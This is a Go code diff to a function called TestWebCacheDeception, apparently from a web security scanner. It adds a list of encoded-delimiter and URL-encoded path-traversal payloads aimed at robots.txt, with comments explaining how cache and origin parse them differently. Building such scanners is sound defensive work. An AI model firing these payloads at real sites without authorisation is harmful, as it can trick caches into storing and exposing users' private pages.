@@ -68,7 +68,20 @@ func TestWebCacheDeception() reportResult {
 		";%2f%2e%2e%2fresources%2fnonexistent8.css",
 		"?%2f%2e%2e%2fresources%2fnonexistent9.css",
 		"&%2f%2e%2e%2fresources%2fnonexistent10.css",
-		// --- Encoded path traversal to robots.txt ---
+		// --- Single-level encoded path traversal to robots.txt (e.g. PortSwigger Lab 5 pattern) ---
+		// Pattern: <delimiter>%2f%2e%2e%2frobots.txt
+		// The cache treats the appended path as a static file; the origin resolves the traversal.
+		";%2f%2e%2e%2frobots.txt",      // Semicolon + single-level encoded traversal
+		"?%2f%2e%2e%2frobots.txt",      // Question mark + single-level encoded traversal
+		"&%2f%2e%2e%2frobots.txt",      // Ampersand + single-level encoded traversal
+		"%0A%2f%2e%2e%2frobots.txt",    // Encoded Newline + single-level encoded traversal
+		"%09%2f%2e%2e%2frobots.txt",    // Encoded Tab + single-level encoded traversal
+		"%00%2f%2e%2e%2frobots.txt",    // Encoded Null Byte + single-level encoded traversal
+		"%3B%2f%2e%2e%2frobots.txt",    // Encoded Semicolon + single-level encoded traversal
+		"%23%2f%2e%2e%2frobots.txt",    // Encoded Pound + single-level encoded traversal
+		"%3F%2f%2e%2e%2frobots.txt",    // Encoded Question Mark + single-level encoded traversal
+		"%26%2f%2e%2e%2frobots.txt",    // Encoded Ampersand + single-level encoded traversal
+		// --- Multi-level encoded path traversal to robots.txt (deep traversal fallback) ---
 		"%0A%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
 		"%00%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
 		"%09%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2frobots.txt",
